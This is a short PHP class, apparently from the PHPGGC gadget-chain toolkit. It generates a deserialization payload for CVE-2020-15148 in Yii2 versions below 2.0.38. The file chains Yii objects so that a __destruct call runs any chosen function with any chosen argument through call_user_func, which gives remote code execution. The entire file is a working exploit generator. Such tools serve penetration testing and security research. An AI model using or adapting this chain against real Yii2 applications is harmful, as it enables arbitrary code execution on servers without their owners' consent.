<?php

namespace GadgetChain\Yii2;


// CVE-2020-15148
class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '<2.0.38';
    public static $vector = '__destruct';
    public static $author = 'russtone';
    public static $information = 'Executes $function with $parameter using call_user_func.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $cache = new \yii\caching\ArrayCache($function, $parameter);
        $csb = new \yii\db\ColumnSchemaBuilder($cache);
        $conn = new \yii\db\Connection($csb);
        $query = new \yii\db\BatchQueryResult($conn);

        return $query;
    }
}
